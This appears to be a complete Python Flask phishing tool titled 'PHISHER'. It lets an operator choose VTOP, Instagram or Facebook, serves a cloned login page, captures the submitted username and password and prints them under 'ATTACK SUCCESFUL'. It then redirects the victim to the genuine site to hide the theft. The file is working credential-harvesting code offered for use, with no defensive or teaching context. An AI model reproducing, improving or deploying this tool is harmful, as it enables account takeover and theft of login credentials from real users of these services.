from flask import Flask, redirect, request, render_template_string

app = Flask(__name__)
import logging
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)  # Set to WARNING or ERROR to suppress more messages


print("Welcome!")
print("""

██████╗░██╗░░██╗██╗░██████╗██╗░░██╗███████╗██████╗░
██╔══██╗██║░░██║██║██╔════╝██║░░██║██╔════╝██╔══██╗
██████╔╝███████║██║╚█████╗░███████║█████╗░░██████╔╝
██╔═══╝░██╔══██║██║░╚═══██╗██╔══██║██╔══╝░░██╔══██╗
██║░░░░░██║░░██║██║██████╔╝██║░░██║███████╗██║░░██║
╚═╝░░░░░╚═╝░░╚═╝╚═╝╚═════╝░╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝
""")
import time
import sys

# Function to display a loading bar for 10 seconds
def loading_bar(duration=5):
    total_length = 35  # Length of the loading bar
    interval = duration / total_length  # Time interval for each progress step
    
    # Print the loading bar
    print("Loading:", end=" ")
    for i in range(total_length):
        time.sleep(interval)  # Wait for the interval duration
        # Print progress symbol
        sys.stdout.write("█")
        sys.stdout.flush()
    
    # Print completion message
    print("\nLoading complete!")

# Call the function to display the loading bar
loading_bar()

print()
print()
print("\033[31mwhich site do you want to phish?:\033[0m")
print()
print("[01] VTOP")
print("[02] Instagram")
print("[03] Facebook")
print()
ch = input("your choice:")

print("your site is Running on \033[34mhttp://127.0.0.1:8000\033[0m")
if ch == "01":
    with open("main.html", "r") as f:
      form_html = f.read()
elif ch == "02":
    with open("insta.html", "r") as f:
      form_html = f.read()  
elif ch == "03":
    with open("facebook.html", "r", encoding="utf-8") as f:
      form_html = f.read()           

@app.route('/')
def home():
    return form_html

@app.route('/submit', methods=['POST'])
def submit():
    name = request.form['username']
    email = request.form['password']
    
    # Send data to the command line
    print()
    print("\033[31mATTACK SUCCESFUL --\033[0m")
    print()
    print(f"\033[33musername: {name}\033[0m")
    print(f"\033[33mPassword: {email}\033[0m")
    if ch == "01":
        return redirect('https://vtop.vit.ac.in/vtop/login')
    elif ch == "02":
        return redirect('https://www.instagram.com/') 
    elif ch == "03":
        return redirect('https://www.facebook.com/?stype=lo&deoia=1&jlou=AffHKL5Knr_AmOCWE6IdjX8MXR966McLj2VT0xxaKVnFVaYO3_N1rpgce90y_RCMnkLg4x2uw5MMD4sy1mTWVsHbNzfsO1JdGZZMuAhwaSHZeA&smuh=10594&lh=Ac_1sW3Pk8JiM7w6z8c') 


    
    return redirect('https://www.instagram.com/')

if __name__ == '__main__':
    app.run(port=8000,debug=False)

